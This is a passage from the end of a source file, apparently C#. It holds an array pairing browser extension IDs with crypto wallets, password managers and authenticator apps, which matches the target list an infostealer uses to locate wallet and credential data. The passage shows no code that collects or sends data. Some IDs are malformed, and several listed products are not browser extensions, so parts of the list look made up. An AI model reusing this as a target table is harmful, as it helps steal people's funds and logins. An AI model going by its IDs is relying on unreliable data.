            "admmjipmmciaobhojoghlmleefbicajg|Norton Password Manager", "caljgklbbfbcjjanaijlacgncafpegll|Avira Password Manager", "imloifkgjagghnncjkhggdhalmcnfklk|Trezor Password Manager", "cphhlgmgameodnhkjdmkpanlelnlohao|NeoLine", "dmkamcknogkgcdfhhbddcghachkejeap|Keplr", "fhmfendgdocmcbmfikdcogofphimnkno|Sollet", "flpiciilemghbmfalicajoolhkkenfel|ICONex", "hcflpincpppdclinealmandijcmnkbgn|KHC", "mnfifefkajgofkcjkemidiaecocnkjeh|TezBox", "nlgbhdfgdhgbiamfdfmbikcdghidoadd|Byone",
            "ilbbpajmiplgpehdikmejfemfklpkmke|OneKey", "pknlccmneadmjbkollckpblgaaabameg|Trust Wallet", "pfknkoocfefiocadajpngdknmkjgakdg|MetaWallet", "fcglfhcjfpkgdppjbglknafgfffkelnm|Guarda Wallet", "idkppnahnmmggbmfkjhiakkbkdpnmnon|Exodus", "mhonjhhcgphdphdjcdoeodfdliikapmj|Jaxx Liberty", "bhmlbgebokamljgnceonbncdofmmkedg|Atomic Wallet", "hieplnfojfccegoloniefimmbfjdgcgp|Electrum", "pidhddgciaponoajdngciiemcflpnnbg|Mycelium", "blbpgcogcoohhngdjafgpoagcilicpjh|Coinomi",
            "gflpckpfdgcagnbdfafmibcmkadnlhpj|GreenAddress", "doljkehcfhidippihgakcihcmnknlphh|Edge", "nbokbjkelpmlgflobbohapifnnenbjlh|BRD", "apjdnokplgcjkejimjdfjnhmjlbpgkdi|Samourai Wallet", "ieedgmmkpkbiblijbbldefkomatsuahh|Copay", "jifanbgejlbcmhbbdbnfbfnlmbomjedj|Bread", "dojmlmceifkfgkgeejemfciibjehhdcl|KeepKey", "jpxupxjxheguvfyhfhahqvxvyqthiryh|Trezor", "pfkcfdjnlfjcmkjnhcbfhfkkoflnhjln|Ledger Live", "hbpfjlflhnmkddbjdchbbifhllgmmhnm|Ledger Wallet",
            "ocmfilhakdbncmojmlbagpkjfbmeinbd|Bitbox", "dbhklojmlkgmpihhdooibnmidfpeaing|Digital Bitbox", "mammpjaaoinfelloncbbpomjcihbkmmc|YubiKey", "khcodhlfkpmhibicdjjblnkgimdepgnd|Google Authenticator", "bfbdnbpibgndpjfhonkflpkijfapmomn|Microsoft Authenticator", "gjffdbjndmcafeoehgdldobgjmlepcal|Authy", "eidlicjlkaiefdbgmdepmmicpbggmhoj|Duo Mobile", "bobfejfdlhnabgglompioclndjejolch|OTP Auth", "elokfmmmjbadpgdjmgglocapdckdcpkn|FreeOTP", "ppdjlkfkedmidmclhakfncpfdmdgmjpm|Aegis Authenticator",
            "cfoajccjibkjhbdjnpkbananbejpkkjb|LastPass Authenticator", "flikjlpgnpcjdienoojmgliechmmheek|Dashlane", "gofhklgdnbnpcdigdgkgfobhhghjmmkj|Keeper", "hppmchachflomkejbhofobganapojjol|RoboForm", "lbfeahdfdkibininjgejjgpdafeopflb|KeePass", "kgeohlebpjgcfiidfhhdlnnkhefajmca|KeePassXC", "inljaljiffkdgmlndjkdiepghpolcpki|Bitwarden", "njgnlkhcjgmjfnfahdmfkalpjcneebpl|NordPass", "gabedfkgnbglfbnplfpjddgfnbibkmbb|LastPass"
        };
    }
}
